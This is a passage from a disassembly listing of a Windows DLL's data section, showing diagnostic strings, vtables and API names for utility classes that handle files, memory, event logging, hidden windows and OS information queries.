a0x04x_0	db '-%0x%04X',0         ; DATA XREF: Ordinal677+72o
		align 10h
; char aS_2[]
aS_2		db '\%s',0              ; DATA XREF: Ordinal677+55o
off_6AF5BE74	dd offset sub_6AF42E39	; DATA XREF: Ordinal680+Co Ordinal681o
		dd offset Ordinal684
		dd offset Ordinal684
		dd offset Ordinal684
off_6AF5BE84	dd offset sub_6AF42EE6	; DATA XREF: Ordinal686+6o
					; Ordinal685+6o
		dd offset Ordinal692
		dd offset Ordinal692
aCencryptedst_1	db 'CEncryptedString::Decrypt()',0 ; DATA XREF: Ordinal688:loc_6AF42F98o
; char aCencryptedst_0[]
aCencryptedst_0	db 'CEncryptedString::Decrypt() : Decrypt() == FALSE',0Ah,0
					; DATA XREF: Ordinal688+86o
		align 10h
aCencryptedstri	db 'CEncryptedString::Decrypt() : m_DecData.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal688+61o
off_6AF5BF1C	dd offset sub_6AF43144	; DATA XREF: Ordinal698+8o
					; Ordinal695+Ao ...
; char aCerrorinfoBuil[]
aCerrorinfoBuil	db 'CErrorInfo::BuildDescription() : FormatMessage() == 0, 0x%08X',0Ah,0
					; DATA XREF: Ordinal704+3Co
		align 10h
		dd offset Src		; "SYSTEM\\CurrentControlSet\\Services\\Event"...
		dd offset aEventmessagefi ; "EventMessageFile"
		dd offset aTypessupported ; "TypesSupported"
; char aTypessupported[]
aTypessupported	db 'TypesSupported',0   ; DATA XREF: Ordinal707+1A5o
					; .rdata:6AF5BF68o
		align 4
; char aEventmessagefi[]
aEventmessagefi	db 'EventMessageFile',0 ; DATA XREF: Ordinal707+191o
					; .rdata:6AF5BF64o
		align 10h
; char Src[]
Src		db 'SYSTEM\CurrentControlSet\Services\EventLog\Application\',0
					; DATA XREF: Ordinal708+28o
					; Ordinal707+9Ao ...
off_6AF5BFC8	dd offset sub_6AF435FC	; DATA XREF: Ordinal705+Eo
					; Ordinal706+3o
; char aCeventlogUnreg[]
aCeventlogUnreg	db 'CEventLog::Unregister() : reg.DeleteKey() == FALSE',0Ah,0
					; DATA XREF: Ordinal708:loc_6AF4324Bo
; char aCeventlogLogRe[]
aCeventlogLogRe	db 'CEventLog::Log() : ReportEvent() == 0, 0x%08X',0Ah,0
					; DATA XREF: Ordinal744+155o
		align 10h
; char aCeventlogLogGe[]
aCeventlogLogGe	db 'CEventLog::Log() : GetUserName() == FALSE',0Ah,0
					; DATA XREF: Ordinal744:loc_6AF43440o
		align 4
aCeventlogLogLo	db 'CEventLog::Log() : LookupAccountName() == FALSE',0Ah,0
					; DATA XREF: Ordinal744+10Eo
		align 10h
; char aCeventlogLogM_[]
aCeventlogLogM_	db 'CEventLog::Log() : m_hSource == NULL',0Ah,0 ; DATA XREF: Ordinal744+2Eo
		align 4
; char aCeventlogOpenS[]
aCeventlogOpenS	db 'CEventLog::Open() : szName == NULL',0Ah,0
					; DATA XREF: Ordinal709:loc_6AF43531o
; char aCeventlogOpenR[]
aCeventlogOpenR	db 'CEventLog::Open() : RegisterEventSource() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal709+4Co
		align 4
aCeventlogTrace	db 'CEventLog::TraceV()',0 ; DATA XREF: Ordinal714+28o
; char aCeventlogReg_1[]
aCeventlogReg_1	db 'CEventLog::Register() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal707:loc_6AF43BA6o
		align 4
aCeventlogReg_0	db 'CEventLog::Register()',0 ; DATA XREF: Ordinal707+8Do
		align 4
; char aCeventlogRegis[]
aCeventlogRegis	db 'CEventLog::Register() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal707+65o
		align 4
off_6AF5C1A8	dd offset sub_6AF43C8C	; DATA XREF: Ordinal745+Ao Ordinal746o
		dd offset Ordinal749
off_6AF5C1B0	dd offset sub_6AF43D4F	; DATA XREF: Ordinal752+6o
					; Ordinal751+Eo
; char aSSSSLd[]
aSSSSLd		db '%s, %s, %s, %s (%ld)',0 ; DATA XREF: Ordinal767+30o
		align 4
off_6AF5C1CC	dd offset sub_6AF443DE	; DATA XREF: Ordinal768+Ao
					; Ordinal769+Fo ...
; char aCfileSeekSetfi[]
aCfileSeekSetfi	db 'CFile::Seek() : SetFilePointer() == INVALID_SET_FILE_POINTER, 0x%'
					; DATA XREF: Ordinal775+38o
		db '08X',0Ah,0
		align 4
; char aCfileReadReadf[]
aCfileReadReadf	db 'CFile::Read() : ReadFile() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal778+37o
		align 4
; char aCfileWriteWrit[]
aCfileWriteWrit	db 'CFile::Write() : WriteFile() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal780+37o
		align 4
; char aCfileAttachHfi[]
aCfileAttachHfi	db 'CFile::Attach() : hFile == INVALID_HANDLE_VALUE',0Ah,0
					; DATA XREF: Ordinal782+Do
		align 10h
; char aCfileGetlength[]
aCfileGetlength	db 'CFile::GetLength() : GetFileSize() == INVALID_FILE_SIZE, 0x%08X',0Ah
					; DATA XREF: Ordinal787+36o
		db 0
		align 8
; char aCfileGetpositi[]
aCfileGetpositi	db 'CFile::GetPosition() : SetFilePointer() == INVALID_SET_FILE_POINT'
					; DATA XREF: Ordinal791+40o
		db 'ER, 0x%08X',0Ah,0
		align 4
; char aCfileCfileAtta[]
aCfileCfileAtta	db 'CFile::CFile() : Attach() == FALSE',0Ah,0 ; DATA XREF: Ordinal769+1Eo
; char aCfileOperatorA[]
aCfileOperatorA	db 'CFile::operator =() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal771+10o
		align 4
; char aCfileOpenSzfil[]
aCfileOpenSzfil	db 'CFile::Open() : szFileName == NULL',0Ah,0
					; DATA XREF: Ordinal773:loc_6AF44230o
		align 10h
; char aCfileOpenCreat[]
aCfileOpenCreat	db 'CFile::Open() : CreateFile() == INVALID_HANDLE_VALUE, %s, 0x%08X',0Ah
					; DATA XREF: Ordinal773+49o
		db 0
		align 4
; char aCfileSetlength[]
aCfileSetlength	db 'CFile::SetLength() : SetEndOfFile() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal789+2Do
		align 4
; char aCfileDeleteD_1[]
aCfileDeleteD_1	db 'CFile::Delete() : ::DeleteFile() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal794+A7o
		align 10h
; char aCfileDeleteD_0[]
aCfileDeleteD_0	db 'CFile::Delete() : deleteFile.SetLength(0) == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal794+6Do
; char aCfileDeleteDel[]
aCfileDeleteDel	db 'CFile::Delete() : deleteFile.Open() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal794+43o
		align 8
; char aCfileMakesur_1[]
aCfileMakesur_1	db 'CFile::MakeSureDirectoryExists() : (dwAttributes & FILE_ATTRIBUTE'
					; DATA XREF: Ordinal795+E5o
		db '_DIRECTORY) == 0',0Ah,0
		align 10h
; char aCfileMakesur_0[]
aCfileMakesur_0	db 'CFile::MakeSureDirectoryExists() : CreateDirectory() == FALSE, 0x'
					; DATA XREF: Ordinal795+C3o
		db '%08X',0Ah,0
		align 4
aCfileMakesured	db 'CFile::MakeSureDirectoryExists()',0 ; DATA XREF: Ordinal795+18o
		align 4
off_6AF5C5AC	dd offset sub_6AF44784	; DATA XREF: Ordinal796+1Eo
					; Ordinal797+6o
		dd offset Ordinal825
		dd offset Ordinal826
		dd offset Ordinal827
off_6AF5C5BC	dd offset sub_6AF4477C	; DATA XREF: Ordinal796+17o
					; Ordinal797+Co
; char aCfilearchive_0[]
aCfilearchive_0	db 'CFileArchive::SetPosEx() : uPos >= uFileLength',0Ah,0
					; DATA XREF: Ordinal827:loc_6AF4475Fo
aCfilearchiveSe	db 'CFileArchive::SetPosEx() : CFile::GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal827+20o
off_6AF5C628	dd offset sub_6AF44839	; DATA XREF: Ordinal828+6o Ordinal829o ...
		align 10h
; char aCgitRevokeM_pg[]
aCgitRevokeM_pg	db 'CGIT::Revoke() : m_pGIT->RevokeInterfaceFromGlobal() != S_OK, 0x%'
					; DATA XREF: Ordinal832+22o
		db '08X',0Ah,0
		align 4
; char aCgitCreateCocr[]
aCgitCreateCocr	db 'CGIT::Create() : CoCreateInstance(IID_IGlobalInterfaceTable) != S'
					; DATA XREF: Ordinal830+27o
		db '_OK, 0x%08X',0Ah,0
		align 4
off_6AF5C6C8	dd offset sub_6AF4493B	; DATA XREF: Ordinal833+6o Ordinal836o ...
; char aChandleAttachH[]
aChandleAttachH	db 'CHandle::Attach() : hHandle == NULL',0Ah,0
					; DATA XREF: Ordinal840:loc_6AF448BFo
		align 4
; char aChandleCopyDup[]
aChandleCopyDup	db 'CHandle::Copy() : DuplicateHandle() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal842+34o
		align 4
; char aChandleChandle[]
aChandleChandle	db 'CHandle::CHandle() : Copy() == FALSE',0Ah,0 ; DATA XREF: Ordinal834+1Ao
		align 4
; char aChandleChand_0[]
aChandleChand_0	db 'CHandle::CHandle() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal835+1Ao
; char aChandleOperato[]
aChandleOperato	db 'CHandle::operator =() : Copy() == FALSE',0Ah,0
					; DATA XREF: Ordinal837+16o
		align 4
; char aChandleOpera_0[]
aChandleOpera_0	db 'CHandle::operator =() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal838+10o
		align 4
off_6AF5C7D4	dd offset sub_6AF44B93	; DATA XREF: Ordinal847o Ordinal846+Co
; char aImmdisableime[]
aImmdisableime	db 'ImmDisableIME',0    ; DATA XREF: Ordinal1062+22o
					; Ordinal849+26o ...
		align 4
; char aChiddenwindowE[]
aChiddenwindowE	db 'CHiddenWindow::ExitInstance()',0Ah,0 ; DATA XREF: Ordinal857+1o
		align 4
; char aChiddenwindowR[]
aChiddenwindowR	db 'CHiddenWindow::Run()',0Ah,0 ; DATA XREF: Ordinal858+8o
		align 10h
; char aChiddenwindo_1[]
aChiddenwindo_1	db 'CHiddenWindow::WindowProc() : WM_DESTROY',0Ah,0
					; DATA XREF: Ordinal859:loc_6AF44B2Bo
		align 4
; char aChiddenwindo_0[]
aChiddenwindo_0	db 'CHiddenWindow::WindowProc() : WM_QUERYENDSESSION',0Ah,0
					; DATA XREF: Ordinal859:loc_6AF44B17o
		align 10h
; char aChiddenwindowW[]
aChiddenwindowW	db 'CHiddenWindow::WindowProc() : WM_ENDSESSION, wParam = %ld, lParam'
					; DATA XREF: Ordinal859+27o
		db ' = %ld',0Ah,0
		align 4
; char aChiddenwindo_4[]
aChiddenwindo_4	db 'CHiddenWindow::InitInstance() : SetWindowLongPtr() == 0',0Ah,0
					; DATA XREF: Ordinal856+145o
		align 4
aChiddenwindo_3	db 'CHiddenWindow::InitInstance() : CreateWindowEx() == NULL',0Ah,0
					; DATA XREF: Ordinal856+11Do
		align 4
aChiddenwindo_2	db 'CHiddenWindow::InitInstance() : RegisterClassEx() == 0',0Ah,0
					; DATA XREF: Ordinal856+F0o
; char aCserviceappR_0[]
aCserviceappR_0	db 'CServiceApp::Run() : imm32.Load() == FALSE',0Ah,0
					; DATA XREF: Ordinal856:loc_6AF44C85o
					; Ordinal1074:loc_6AF49821o
; char aCserviceappRun[]
aCserviceappRun	db 'CServiceApp::Run() : ImmDisableIME() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal856+47o
					; Ordinal1074+56o
		align 10h
; char aImm32_dll[]
aImm32_dll	db 'IMM32.DLL',0        ; DATA XREF: Ordinal856+1Eo
					; Ordinal1074+2Do
		align 4
; char aChiddenwindowI[]
aChiddenwindowI	db 'CHiddenWindow::InitInstance()',0Ah,0 ; DATA XREF: Ordinal856+9o
		align 4
off_6AF5CA0C	dd offset sub_6AF44E05	; DATA XREF: Ordinal852+14o
					; Ordinal853+3o
		dd offset Ordinal1388
		dd offset Ordinal855
		dd offset Ordinal858
		dd offset Ordinal856
		dd offset Ordinal857
		dd offset _purecall
		dd offset _purecall
		dd offset _purecall
		dd offset Ordinal859
; char aChiddenwindo_6[]
aChiddenwindo_6	db 'CHiddenWindow::Create() : szClassName == NULL',0Ah,0
					; DATA XREF: Ordinal854:loc_6AF44F82o
		align 4
; char aChiddenwindo_5[]
aChiddenwindo_5	db 'CHiddenWindow::Create() : CThread::Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal854+145o
		align 4
aChiddenwindowC	db 'CHiddenWindow::Create',0 ; DATA XREF: Ordinal854+5Bo
		align 4
off_6AF5CAB4	dd offset sub_6AF4535A	; DATA XREF: Ordinal861+4o Ordinal863o ...
off_6AF5CAB8	dd offset sub_6AF45019	; DATA XREF: sub_6AF44FFF+Eo
					; sub_6AF45035o ...
		dd offset ?what@exception@@UBEPBDXZ ; exception::what(void)
; char aCmemoryNewal_0[]
aCmemoryNewal_0	db 'CMemory::NewAlloc() : new() == NULL',0Ah,0 ; DATA XREF: Ordinal870+129o
		align 4
aBadAllocation	db 'bad allocation',0   ; DATA XREF: Ordinal870+60o
					; Ordinal910+Co ...
		align 4
aCmemoryNewallo	db 'CMemory::NewAlloc()',0 ; DATA XREF: Ordinal870+25o
; char aCmemoryHeapall[]
aCmemoryHeapall	db 'CMemory::HeapAlloc() : HeapAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal871+30o
; char aCmemoryVirtual[]
aCmemoryVirtual	db 'CMemory::VirtualAlloc() : VirtualAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal872+5Eo
		align 4
; char aCmemoryReall_2[]
aCmemoryReall_2	db 'CMemory::ReAlloc() : mem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal873+99o
		align 4
; char aCmemoryReall_1[]
aCmemoryReall_1	db 'CMemory::ReAlloc() : mem.Alloc() == NULL',0Ah,0
					; DATA XREF: Ordinal873+71o
		align 4
; char aCmemoryReall_0[]
aCmemoryReall_0	db 'CMemory::ReAlloc() : m_nSize == nSize',0Ah,0 ; DATA XREF: Ordinal873+2Bo
		align 10h
; char aCmemoryRealloc[]
aCmemoryRealloc	db 'CMemory::ReAlloc() : m_pData == NULL',0Ah,0 ; DATA XREF: Ordinal873+11o
		align 4
off_6AF5CC18	dd offset sub_6AF45630	; DATA XREF: Ordinal881+22o
					; Ordinal882+6o
		dd offset Ordinal886
		dd offset Ordinal887
		dd offset Ordinal888
off_6AF5CC28	dd offset sub_6AF45628	; DATA XREF: Ordinal881+1Bo
					; Ordinal882+Co
; char aCmemoryarchive[]
aCmemoryarchive	db 'CMemoryArchive::ReadEx() : m_nSize - m_nDataSize < dwSize',0Ah,0
					; DATA XREF: Ordinal886+14o
		align 4
; char aCmemoryarchi_0[]
aCmemoryarchi_0	db 'CMemoryArchive::WriteEx() : ReAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal887+23o
		align 4
; char aCmemoryarchi_1[]
aCmemoryarchi_1	db 'CMemoryArchive::SetPosEx() : uPos >= m_nSize',0Ah,0
					; DATA XREF: Ordinal888:loc_6AF45610o
		align 4
off_6AF5CCC8	dd offset sub_6AF45769	; DATA XREF: Ordinal889+6o Ordinal891o ...
; char aCmoduleAttachH[]
aCmoduleAttachH	db 'CModule::Attach() : hModule == NULL',0Ah,0 ; DATA XREF: Ordinal894+Co
		align 4
; char aCmoduleLoadLoa[]
aCmoduleLoadLoa	db 'CModule::Load() : LoadLibrary() == NULL, %s, 0x%08X',0Ah,0
					; DATA XREF: Ordinal896+25o
		align 4
; char aCmoduleLoadL_0[]
aCmoduleLoadL_0	db 'CModule::Load() : LoadLibraryEx() == NULL, %s, 0x%08X',0Ah,0
					; DATA XREF: Ordinal897+2Bo
		align 4
; char aCmoduleGetproc[]
aCmoduleGetproc	db 'CModule::GetProc() : GetProcAddress() == NULL, %s, 0x%08X',0Ah,0
					; DATA XREF: Ordinal899+1Fo
		align 10h
; char aCmoduleCmodule[]
aCmoduleCmodule	db 'CModule::CModule() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal890+1Ao
; char aCmoduleOperato[]
aCmoduleOperato	db 'CModule::operator =() : Attach() == FALSE',0Ah,0
					; DATA XREF: Ordinal892+10o
		align 4
; char aCmulticonsoleA[]
aCmulticonsoleA	db 'CMultiConsole::Add() : pos == m_WindowMap.end()',0Ah,0
					; DATA XREF: Ordinal904+48o
		align 4
off_6AF5CE28	dd offset sub_6AF460E3	; DATA XREF: Ordinal902+11o
					; Ordinal901+20o
		dd offset Ordinal1388
		dd offset Ordinal1389
		dd offset Ordinal499
		dd offset Ordinal497
		dd offset Ordinal498
		dd offset Ordinal905
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal490
		dd offset Ordinal1091
		dd offset Ordinal495
		dd offset Ordinal495
		dd offset Ordinal495
		dd offset Ordinal495
aCmulticonsol_1	db 'CMultiConsole::Add()',0 ; DATA XREF: Ordinal903:loc_6AF46162o
		align 10h
; char aCmulticonsol_0[]
aCmulticonsol_0	db 'CMultiConsole::Add() : pos != m_WindowMap.end()',0Ah,0
					; DATA XREF: Ordinal903+54o
		align 4
off_6AF5CEB4	dd offset sub_6AF4632C	; DATA XREF: Ordinal906+4o Ordinal907o
		dd offset Ordinal910
off_6AF5CEBC	dd offset sub_6AF46468	; DATA XREF: Ordinal914+14o
					; Ordinal915o ...
; char aCnulldaclCreat[]
aCnulldaclCreat	db 'CNullDacl::Create() : InitializeSecurityDescriptor() == FALSE, 0x'
					; DATA XREF: Ordinal918+81o
		db '%08X',0Ah,0
		align 4
off_6AF5CF08	dd offset sub_6AF4663D	; DATA XREF: Ordinal921o Ordinal920+Co
; char aVerifyversio_0[]
aVerifyversio_0	db 'VerifyVersionInfoW',0 ; DATA XREF: Ordinal925:loc_6AF464E9o
					; Ordinal922:loc_6AF466A6o ...
		align 10h
; char aVerifyversioni[]
aVerifyversioni	db 'VerifyVersionInfoA',0 ; DATA XREF: Ordinal925:loc_6AF464D4o
					; Ordinal922:loc_6AF46691o ...
		align 4
; char aVersetconditio[]
aVersetconditio	db 'VerSetConditionMask',0 ; DATA XREF: Ordinal925:loc_6AF464BFo
					; Ordinal922+22o ...
off_6AF5CF48	dd offset sub_6AF4675C	; DATA XREF: Ordinal927o Ordinal926+Co
; char aWtsfreememory[]
aWtsfreememory	db 'WTSFreeMemory',0    ; DATA XREF: Ordinal931:loc_6AF46565o
					; Ordinal928:loc_6AF467C5o ...
		align 4
; char aWtsquerysess_0[]
aWtsquerysess_0	db 'WTSQuerySessionInformationW',0 ; DATA XREF: Ordinal931:loc_6AF46550o
					; Ordinal928:loc_6AF467B0o ...
; char aWtsquerysessio[]
aWtsquerysessio	db 'WTSQuerySessionInformationA',0 ; DATA XREF: Ordinal931:loc_6AF4653Bo
					; Ordinal928+22o ...
off_6AF5CF94	dd offset sub_6AF4690E	; DATA XREF: Ordinal933+9o
					; Ordinal932+Do
; char aCosinfoCosinfo[]
aCosinfoCosinfo	db 'COSInfo::COSInfo() : GetVersionEx() == FALSE, 0x%08X',0
					; DATA XREF: Ordinal932+7Do
		align 10h
; char aCosinfoIniti_0[]
aCosinfoIniti_0	db 'COSInfo::Initialize() : m_WTSAPI32.Load() == FALSE',0Ah,0
					; DATA XREF: Ordinal952+47o
; char aWtsapi32_dll[]
aWtsapi32_dll	db 'WTSAPI32.DLL',0     ; DATA XREF: Ordinal952:loc_6AF469B9o
		align 4
; char aCosinfoInitial[]
aCosinfoInitial	db 'COSInfo::Initialize() : m_Kernel32.Load() == FALSE',0Ah,0
					; DATA XREF: Ordinal952+28o
; char aKernel32_dll_0[]
aKernel32_dll_0	db 'KERNEL32.DLL',0     ; DATA XREF: Ordinal952+Eo
					; Ordinal1101+3Ao ...
		align 4
; char aCosinfoIster_2[]
aCosinfoIster_2	db 'COSInfo::IsTerminalServerEx() : reg.QueryValue() == FALSE',0Ah,0
					; DATA XREF: Ordinal953:loc_6AF46B76o
					; Ordinal953:loc_6AF46B99o
		align 4
; unsigned __int8 aTerminalServer
aTerminalServer	db 'Terminal Server',0  ; DATA XREF: Ordinal953:loc_6AF46B4Eo
; char aCosinfoIster_1[]
aCosinfoIster_1	db 'COSInfo::IsTerminalServerEx() : mem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal953+136o
; char aProductsuite[]
aProductsuite	db 'ProductSuite',0     ; DATA XREF: Ordinal953+F9o
					; Ordinal953+157o
		align 4
aCosinfoIster_0	db 'COSInfo::IsTerminalServerEx() : reg.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal953+E5o
		align 4
; char aSystemCurren_0[]
aSystemCurren_0	db 'System\CurrentControlSet\Control\ProductOptions',0
					; DATA XREF: Ordinal953+CFo
		align 8
; char aCosinfoIstermi[]
aCosinfoIstermi	db 'COSInfo::IsTerminalServerEx() : m_Kernel32.VerSetConditionMask =='
					; DATA XREF: Ordinal953:loc_6AF46A7Fo
		db ' NULL',0Ah,0
; char aCosinfoIsadm_2[]
aCosinfoIsadm_2	db 'COSInfo::IsAdministratorEx() : mem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal954+14Bo
		align 4
; char aCosinfoIsadm_1[]
aCosinfoIsadm_1	db 'COSInfo::IsAdministratorEx() : GetTokenInformation() == FALSE, 0x'
					; DATA XREF: Ordinal954+12Ao
					; Ordinal954+17Bo
		db '%08X',0Ah,0
		align 10h
; char aCosinfoIsadm_0[]
aCosinfoIsadm_0	db 'COSInfo::IsAdministratorEx() : OpenProcessToken() == FALSE, 0x%08'
					; DATA XREF: Ordinal954+F1o
		db 'X',0Ah,0
		align 8
; char aCosinfoIsadmin[]
aCosinfoIsadmin	db 'COSInfo::IsAdministratorEx() : AllocateAndInitializeSid() == FALS'
					; DATA XREF: Ordinal954+6Eo
		db 'E, 0x%08X',0Ah,0
; char aCosinfoIssys_2[]
aCosinfoIssys_2	db 'COSInfo::IsSystemEx() : GlobalAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal955+11Co
		align 8
; char aCosinfoIssys_1[]
aCosinfoIssys_1	db 'COSInfo::IsSystemEx() : GetTokenInformation() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal955+FBo
					; Ordinal955+14Co
; char aCosinfoIssys_0[]
aCosinfoIssys_0	db 'COSInfo::IsSystemEx() : OpenProcessToken() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal955+C2o
		align 4
; char aCosinfoIssyste[]
aCosinfoIssyste	db 'COSInfo::IsSystemEx() : AllocateAndInitializeSid() == FALSE, 0x%0'
					; DATA XREF: Ordinal955+69o
		db '8X',0Ah,0
		align 10h
; char aCosinfoIsactiv[]
aCosinfoIsactiv	db 'COSInfo::IsActiveSession() : m_WTSAPI32.WTSQuerySessionInformatio'
					; DATA XREF: Ordinal948+B6o
		db 'n() == FALSE, 0x%08X',0
		align 4
; unsigned __int8 aB
aB		db 'b',0                ; DATA XREF: Ordinal937+3Ao
		align 4
; unsigned __int8 aC_0
aC_0		db 'c',0                ; DATA XREF: Ordinal938+3Ao
		align 10h
; unsigned __int8 aC_1
aC_1		db 'C',0                ; DATA XREF: Ordinal938+2Co
		align 4
off_6AF5D414	dd offset unknown_libname_7 ; DATA XREF: Ordinal956+2o
					; Ordinal957o ...
					; Microsoft VisualC 2-10/net runtime
; char aUnknownError0x[]
aUnknownError0x	db 'Unknown error 0x%0lX',0 ; DATA XREF: sub_6AF47470+84o
		align 10h
aIdispatchError	db 'IDispatch error #%d',0 ; DATA XREF: sub_6AF47470+7Co
; char a_com_error[]
a_com_error	db '_com_error',0       ; DATA XREF: Ordinal958+58o
					; sub_6AF47671+Ao ...
		align 10h
aCpropertyhelpe	db 'CPropertyHelper::GetString()',0 ; DATA XREF: Ordinal958+29o
		align 10h
; char aCpropertyhel_1[]
aCpropertyhel_1	db 'CPropertyHelper::GetVariant() : VariantCopyInd() != S_OK',0Ah,0
					; DATA XREF: Ordinal972+50o
		align 4
aCpropertyhel_0	db 'CPropertyHelper::GetVariant()',0 ; DATA XREF: Ordinal972+2Ao
		align 4
; char aCpropertyhel_3[]
aCpropertyhel_3	db 'CPropertyHelper::PutVariant() : VariantCopyInd() != S_OK',0Ah,0
					; DATA XREF: Ordinal973+4Eo
		align 4
aCpropertyhel_2	db 'CPropertyHelper::PutVariant()',0 ; DATA XREF: Ordinal973+13o
		align 4
aCpropertyhel_4	db 'CPropertyHelper::PutString()',0 ; DATA XREF: Ordinal959+13o
		align 4
; char aQueryworkingse[]
aQueryworkingse	db 'QueryWorkingSet',0  ; DATA XREF: Ordinal979:loc_6AF47B0Co
					; Ordinal976:loc_6AF47D4Do ...
; char aInitializeproc[]
aInitializeproc	db 'InitializeProcessForWsWatch',0 ; DATA XREF: Ordinal979:loc_6AF47AF7o
					; Ordinal976:loc_6AF47D38o ...
; char aGetwschanges[]
aGetwschanges	db 'GetWsChanges',0     ; DATA XREF: Ordinal979:loc_6AF47AE2o
					; Ordinal976:loc_6AF47D23o ...
		align 4
; char aGetprocessmemo[]
aGetprocessmemo	db 'GetProcessMemoryInfo',0 ; DATA XREF: Ordinal979:loc_6AF47ACDo
					; Ordinal976:loc_6AF47D0Eo ...
		align 4
; char aGetprocessim_0[]
aGetprocessim_0	db 'GetProcessImageFileNameW',0 ; DATA XREF: Ordinal979:loc_6AF47AB8o
					; Ordinal976:loc_6AF47CF9o ...
		align 4
; char aGetprocessimag[]
aGetprocessimag	db 'GetProcessImageFileNameA',0 ; DATA XREF: Ordinal979:loc_6AF47AA3o
					; Ordinal976:loc_6AF47CE4o ...
		align 4
; char aGetperformance[]
aGetperformance	db 'GetPerformanceInfo',0 ; DATA XREF: Ordinal979:loc_6AF47A8Eo
					; Ordinal976:loc_6AF47CCFo ...
		align 4
; char aGetmoduleinfor[]
aGetmoduleinfor	db 'GetModuleInformation',0 ; DATA XREF: Ordinal979:loc_6AF47A79o
					; Ordinal976:loc_6AF47CBAo ...
		align 10h
; char aGetmodulefil_0[]
aGetmodulefil_0	db 'GetModuleFileNameExW',0 ; DATA XREF: Ordinal979:loc_6AF47A64o
					; Ordinal976:loc_6AF47CA5o ...
		align 4
; char aGetmodulefilen[]
aGetmodulefilen	db 'GetModuleFileNameExA',0 ; DATA XREF: Ordinal979:loc_6AF47A4Fo
					; Ordinal976:loc_6AF47C90o ...
		align 10h
; char aGetmodulebas_0[]
aGetmodulebas_0	db 'GetModuleBaseNameW',0 ; DATA XREF: Ordinal979:loc_6AF47A3Ao
					; Ordinal976:loc_6AF47C7Bo ...
		align 4
; char aGetmodulebasen[]
aGetmodulebasen	db 'GetModuleBaseNameA',0 ; DATA XREF: Ordinal979:loc_6AF47A25o
					; Ordinal976:loc_6AF47C66o ...
		align 4
; char aGetmappedfil_0[]
aGetmappedfil_0	db 'GetMappedFileNameW',0 ; DATA XREF: Ordinal979:loc_6AF47A10o
					; Ordinal976:loc_6AF47C51o ...
		align 4
; char aGetmappedfilen[]
aGetmappedfilen	db 'GetMappedFileNameA',0 ; DATA XREF: Ordinal979:loc_6AF479FBo
					; Ordinal976:loc_6AF47C3Co ...
		align 10h
; char aGetdevicedri_2[]
aGetdevicedri_2	db 'GetDeviceDriverFileNameW',0 ; DATA XREF: Ordinal979:loc_6AF479E6o
					; Ordinal976:loc_6AF47C27o ...
		align 4
; char aGetdevicedri_1[]
aGetdevicedri_1	db 'GetDeviceDriverFileNameA',0 ; DATA XREF: Ordinal979:loc_6AF479D1o
					; Ordinal976:loc_6AF47C12o ...
		align 4
; char aGetdevicedri_0[]
aGetdevicedri_0	db 'GetDeviceDriverBaseNameW',0 ; DATA XREF: Ordinal979:loc_6AF479BCo
					; Ordinal976:loc_6AF47BFDo ...
		align 4
; char aGetdevicedrive[]
aGetdevicedrive	db 'GetDeviceDriverBaseNameA',0 ; DATA XREF: Ordinal979:loc_6AF479A7o
					; Ordinal976:loc_6AF47BE8o ...
		align 10h
; char aEnumprocessmod[]
aEnumprocessmod	db 'EnumProcessModules',0 ; DATA XREF: Ordinal979:loc_6AF47992o
					; Ordinal976:loc_6AF47BD3o ...
		align 4
; char aEnumprocesses[]
aEnumprocesses	db 'EnumProcesses',0    ; DATA XREF: Ordinal979:loc_6AF4797Do
					; Ordinal976:loc_6AF47BBEo ...
		align 4
; char aEnumpagefilesw[]
aEnumpagefilesw	db 'EnumPageFilesW',0   ; DATA XREF: Ordinal979:loc_6AF47968o
					; Ordinal976:loc_6AF47BA9o ...
		align 4
; char aEnumpagefilesa[]
aEnumpagefilesa	db 'EnumPageFilesA',0   ; DATA XREF: Ordinal979:loc_6AF47953o
					; Ordinal976:loc_6AF47B94o ...
		align 4
; char aEnumdevicedriv[]
aEnumdevicedriv	db 'EnumDeviceDrivers',0 ; DATA XREF: Ordinal979:loc_6AF4793Eo
					; Ordinal976:loc_6AF47B7Fo ...
		align 4
; char aEmptyworkingse[]
aEmptyworkingse	db 'EmptyWorkingSet',0  ; DATA XREF: Ordinal979:loc_6AF47929o
					; Ordinal976+25o ...
off_6AF5D758	dd offset sub_6AF48113	; DATA XREF: Ordinal974+Co
					; Ordinal975+3o
; char aCpsapiCreateLo[]
aCpsapiCreateLo	db 'CPSAPI::Create() : Load() == FALSE',0Ah,0 ; DATA XREF: Ordinal980+102o
					; Ordinal980:loc_6AF480FFo
; char aPsapi_dll[]
aPsapi_dll	db 'PSAPI.DLL',0        ; DATA XREF: Ordinal980+22o
		align 4
off_6AF5D78C	dd offset sub_6AF481C5	; DATA XREF: Ordinal982+Ao Ordinal983o
		dd offset Ordinal986
off_6AF5D794	dd offset sub_6AF48635	; DATA XREF: Ordinal988+Ao
					; Ordinal989+Fo ...
; char aCregistryAttac[]
